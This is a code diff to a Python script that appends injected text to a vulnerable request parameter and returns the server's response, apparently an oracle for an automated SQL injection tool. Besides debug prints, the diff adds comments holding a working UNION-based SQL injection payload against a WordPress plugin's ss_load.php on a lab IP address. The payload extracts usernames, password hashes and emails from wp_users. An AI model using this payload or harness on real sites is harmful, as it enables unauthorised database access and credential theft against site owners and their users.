@@ -9,10 +9,13 @@ def http_request(target, injtxt):
     """send a post request to the target with a supplement to the vulnerable param and return server response"""
     injected_target = copy.deepcopy(target)
     injected_target.payload[target.vulnparam] = target.payload[target.vulnparam] + injtxt
+    payload_str = "&".join("%s=%s" % (k,v) for k,v in injected_target.payload.items())
+    
     if target.method == "GET":
-        r = requests.get(injected_target.url, params=injected_target.payload)
+        r = requests.get(injected_target.url, params=payload_str)
     elif target.method == "POST":
-        r = requests.post(injected_target.url, data=injected_target.payload)    
+        r = requests.post(injected_target.url, data=injected_target.payload)
+    print(r.url)    
     return r   
 
 
@@ -29,8 +32,9 @@ class HttpTarget:
 ## Oracle function    
 def main():
     """return 0 only if injtxt is syntactically valid"""
-
+    print(sys.argv[5])
     url, method, vulnparam, injtxt = sys.argv[1], sys.argv[2], sys.argv[4], sys.argv[5]
+
     payload = ast.literal_eval(sys.argv[3])
     
     target = HttpTarget(url, method, payload, vulnparam)
@@ -49,8 +53,8 @@ def main():
 if __name__ == "__main__":
     main()        
     
-
-
+#"http://192.168.56.101/wordpress/wp-content/plugins/wpSS/ss_load.php" GET "{'ss_id':'dt_duplicate_post_as_draft','display':'plain'}" ss_id "1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--"
+#http://192.168.56.101/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&display=plain
     
  
 ## Tests
